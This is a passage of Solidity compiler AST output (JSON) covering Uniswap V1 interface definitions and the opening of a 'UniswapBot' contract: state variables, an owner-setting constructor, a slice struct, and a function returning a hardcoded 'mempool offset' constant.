							"src": "26:145:0"
						}
					],
					"src": "0:172:0"
				},
				"id": 0
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol",
					"exportedSymbols": {
						"IUniswapV1Exchange": [
							71
						]
					},
					"id": 72,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 17,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 71,
							"linearizedBaseContracts": [
								71
							],
							"name": "IUniswapV1Exchange",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "70a08231",
									"id": 24,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 19,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 24,
												"src": "80:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 18,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "80:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "79:15:1"
									},
									"returnParameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 22,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 24,
												"src": "118:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 21,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "118:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "117:6:1"
									},
									"scope": 71,
									"src": "61:63:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "23b872dd",
									"id": 35,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 26,
												"mutability": "mutable",
												"name": "from",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "151:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 25,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "151:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 28,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "165:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 27,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "165:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 30,
												"mutability": "mutable",
												"name": "value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "177:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 29,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "177:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "150:38:1"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 33,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "207:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 32,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "207:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "206:6:1"
									},
									"scope": 71,
									"src": "129:84:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "f88bf15a",
									"id": 50,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "removeLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "243:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 36,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "243:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "249:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "249:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 41,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "255:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 40,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "255:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 43,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "261:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 42,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "261:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "242:24:1"
									},
									"returnParameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 46,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "285:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 45,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "285:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "291:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 47,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "291:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "284:12:1"
									},
									"scope": 71,
									"src": "218:79:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "95e3c50b",
									"id": 61,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tokenToEthSwapInput",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 57,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "331:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "331:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 54,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "337:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 53,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "337:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 56,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "343:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 55,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "343:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "330:18:1"
									},
									"returnParameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "367:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "367:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "366:6:1"
									},
									"scope": 71,
									"src": "302:71:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "f39b5b9b",
									"id": 70,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ethToTokenSwapInput",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 63,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 70,
												"src": "407:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 62,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "407:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 65,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 70,
												"src": "413:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 64,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "413:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "406:12:1"
									},
									"returnParameters": {
										"id": 69,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 68,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 70,
												"src": "445:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 67,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "445:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "444:6:1"
									},
									"scope": 71,
									"src": "378:73:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 72,
							"src": "26:427:1"
						}
					],
					"src": "0:454:1"
				},
				"id": 1
			},
			"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol",
					"exportedSymbols": {
						"IUniswapV1Factory": [
							81
						]
					},
					"id": 82,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 73,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "IUniswapV1Factory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "06f2bf62",
									"id": 80,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getExchange",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 76,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 75,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 80,
												"src": "81:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 74,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "81:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "80:9:2"
									},
									"returnParameters": {
										"id": 79,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 78,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 80,
												"src": "113:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 77,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "113:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "112:9:2"
									},
									"scope": 81,
									"src": "60:62:2",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 82,
							"src": "26:98:2"
						}
					],
					"src": "0:125:2"
				},
				"id": 2
			},
			"trade_bot.sol": {
				"ast": {
					"absolutePath": "trade_bot.sol",
					"exportedSymbols": {
						"UniswapBot": [
							1047
						]
					},
					"id": 1048,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 83,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:3"
						},
						{
							"absolutePath": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol",
							"file": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol",
							"id": 84,
							"nodeType": "ImportDirective",
							"scope": 1048,
							"sourceUnit": 16,
							"src": "107:105:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol",
							"file": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol",
							"id": 85,
							"nodeType": "ImportDirective",
							"scope": 1048,
							"sourceUnit": 72,
							"src": "214:108:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol",
							"file": "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol",
							"id": 86,
							"nodeType": "ImportDirective",
							"scope": 1048,
							"sourceUnit": 82,
							"src": "324:107:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1047,
							"linearizedBaseContracts": [
								1047
							],
							"name": "UniswapBot",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 88,
									"mutability": "mutable",
									"name": "liquidity",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1047,
									"src": "464:14:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 87,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "464:4:3",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 90,
									"mutability": "mutable",
									"name": "pool",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1047,
									"src": "485:17:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 89,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "485:4:3",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 92,
									"mutability": "mutable",
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1047,
									"src": "509:20:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 91,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "509:7:3",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 96,
									"name": "Log",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 95,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 94,
												"indexed": false,
												"mutability": "mutable",
												"name": "_msg",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 96,
												"src": "550:11:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 93,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "550:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "549:13:3"
									},
									"src": "540:23:3"
								},
								{
									"body": {
										"id": 104,
										"nodeType": "Block",
										"src": "674:37:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 102,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 99,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 92,
														"src": "685:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 100,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": -15,
															"src": "693:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 101,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "693:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "685:18:3",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 103,
												"nodeType": "ExpressionStatement",
												"src": "685:18:3"
											}
										]
									},
									"documentation": null,
									"id": 105,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "664:2:3"
									},
									"returnParameters": {
										"id": 98,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "674:0:3"
									},
									"scope": 1047,
									"src": "653:58:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"canonicalName": "UniswapBot.slice",
									"id": 110,
									"members": [
										{
											"constant": false,
											"id": 107,
											"mutability": "mutable",
											"name": "_len",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 110,
											"src": "734:9:3",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 106,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "734:4:3",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 109,
											"mutability": "mutable",
											"name": "_ptr",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 110,
											"src": "748:9:3",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 108,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "748:4:3",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nodeType": "StructDefinition",
									"scope": 1047,
									"src": "716:46:3",
									"visibility": "public"
								},
								{
									"body": {
										"id": 117,
										"nodeType": "Block",
										"src": "1065:23:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "393935343131",
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "1077:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_995411_by_1",
														"typeString": "int_const 995411"
													},
													"value": "995411"
												},
												"functionReturnParameters": 114,
												"id": 116,
												"nodeType": "Return",
												"src": "1070:13:3"
											}
										]
									},
									"documentation": null,
									"id": 118,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 111,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1033:2:3"
									},
									"returnParameters": {
										"id": 114,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 113,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 118,
												"src": "1059:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 112,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1059:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1058:6:3"
									},
									"scope": 1047,
									"src": "1008:80:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 265,
										"nodeType": "Block",
										"src": "1186:1051:3",
										"statements": [
											{
												"assignments": [
													128
												],
												"declarations": [
													{
														"constant": false,
														"id": 128,
														"mutability": "mutable",
														"name": "shortest",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 265,
														"src": "1191:13:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 127,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1191:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 131,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 129,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 120,
														"src": "1207:4:3",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 130,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_len",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 107,
													"src": "1207:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1191:25:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 132,
															"name": "other",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 122,
															"src": "1228:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 133,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 107,
														"src": "1228:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 134,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 120,
															"src": "1241:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 135,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 107,
														"src": "1241:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1228:22:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 142,
												"nodeType": "IfStatement",
												"src": "1224:54:3",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 140,
